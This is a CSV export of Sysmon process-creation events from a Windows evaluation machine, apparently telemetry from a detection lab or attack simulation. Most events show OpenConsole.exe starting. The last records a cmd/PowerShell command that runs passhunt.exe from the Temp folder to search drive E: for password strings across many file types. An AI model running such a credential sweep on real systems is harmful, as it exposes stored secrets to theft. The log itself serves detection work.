ParentUser: -",Info,-,-,-,{00000000-0000-0000-0000-000000000000},932,-,,{fda94052-3d81-658d-9b02-000000000b00},7044,2524,-,,,,,"
      ",-,,,,,,2023-12-28T09:18:57.3315373Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:18:57.329,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:18:57.3315373Z""/>
      <EventRecordID>9512</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:18:57.329</Data>
      <Data Name=""ProcessGuid"">{fda94052-3d81-658d-9b02-000000000b00}</Data>
      <Data Name=""ProcessId"">2524</Data>
      <Data Name=""Image"">C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe</Data>
      <Data Name=""FileVersion"">-</Data>
      <Data Name=""Description"">-</Data>
      <Data Name=""Product"">-</Data>
      <Data Name=""Company"">-</Data>
      <Data Name=""OriginalFileName"">-</Data>
      <Data Name=""CommandLine"">""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">932</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.329

ProcessGuid: {fda94052-3d81-658d-9b02-000000000b00}

ProcessId: 2524

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding",-,WinDev2309Eval,,C:\Windows\system32\,-,,,,,,,1,9511,,-,"MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB",C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.282

ProcessGuid: {fda94052-3d81-658d-9a02-000000000b00}

ProcessId: 5576

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,-,-,-,{00000000-0000-0000-0000-000000000000},932,-,,{fda94052-3d81-658d-9a02-000000000b00},7044,5576,-,,,,,"
      ",-,,,,,,2023-12-28T09:18:57.2875303Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:18:57.282,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:18:57.2875303Z""/>
      <EventRecordID>9511</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:18:57.282</Data>
      <Data Name=""ProcessGuid"">{fda94052-3d81-658d-9a02-000000000b00}</Data>
      <Data Name=""ProcessId"">5576</Data>
      <Data Name=""Image"">C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe</Data>
      <Data Name=""FileVersion"">-</Data>
      <Data Name=""Description"">-</Data>
      <Data Name=""Product"">-</Data>
      <Data Name=""Company"">-</Data>
      <Data Name=""OriginalFileName"">-</Data>
      <Data Name=""CommandLine"">""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">932</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.282

ProcessGuid: {fda94052-3d81-658d-9a02-000000000b00}

ProcessId: 5576

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding",-,WinDev2309Eval,,C:\Windows\system32\,-,,,,,,,1,9510,,-,"MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB",C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.231

ProcessGuid: {fda94052-3d81-658d-9802-000000000b00}

ProcessId: 3332

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,-,-,-,{00000000-0000-0000-0000-000000000000},932,-,,{fda94052-3d81-658d-9802-000000000b00},7044,3332,-,,,,,"
      ",-,,,,,,2023-12-28T09:18:57.2342769Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:18:57.231,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:18:57.2342769Z""/>
      <EventRecordID>9510</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:18:57.231</Data>
      <Data Name=""ProcessGuid"">{fda94052-3d81-658d-9802-000000000b00}</Data>
      <Data Name=""ProcessId"">3332</Data>
      <Data Name=""Image"">C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe</Data>
      <Data Name=""FileVersion"">-</Data>
      <Data Name=""Description"">-</Data>
      <Data Name=""Product"">-</Data>
      <Data Name=""Company"">-</Data>
      <Data Name=""OriginalFileName"">-</Data>
      <Data Name=""CommandLine"">""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">932</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.231

ProcessGuid: {fda94052-3d81-658d-9802-000000000b00}

ProcessId: 3332

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"powershell  -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s E:\ -r '(password|passwort|passwd| -p | -p=| -pw |",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,9509,,10.0.22621.2215 (WinBuild.160101.0800),"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.229

ProcessGuid: {fda94052-3d81-658d-9702-000000000b00}

ProcessId: 2936

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: powershell  -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s E:\ -r '(password|passwort|passwd| -p | -p=| -pw |

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-3d81-658d-9602-000000000b00}

ParentProcessId: 7268

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s E:\ -r '(password|passwort|passwd| -p | -p=| -pw |

          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo

        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s E:\ -r '(password|passwort|passwd| -p | -p=| -pw |
          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""",C:\Windows\System32\cmd.exe,{fda94052-3d81-658d-9602-000000000b00},7268,WINDEV2309EVAL\User,,{fda94052-3d81-658d-9702-000000000b00},7044,2936,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:18:57.2308553Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:18:57.229,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:18:57.2308553Z""/>
      <EventRecordID>9509</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:18:57.229</Data>
      <Data Name=""ProcessGuid"">{fda94052-3d81-658d-9702-000000000b00}</Data>
      <Data Name=""ProcessId"">2936</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">powershell  -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s E:\ -r '(password|passwort|passwd| -p | -p=| -pw |</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-3d81-658d-9602-000000000b00}</Data>
      <Data Name=""ParentProcessId"">7268</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s E:\ -r '(password|passwort|passwd| -p | -p=| -pw |
          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.229

ProcessGuid: {fda94052-3d81-658d-9702-000000000b00}

ProcessId: 2936

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: powershell  -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s E:\ -r '(password|passwort|passwd| -p | -p=| -pw |

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-3d81-658d-9602-000000000b00}

ParentProcessId: 7268

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s E:\ -r '(password|passwort|passwd| -p | -p=| -pw |

          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo

        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
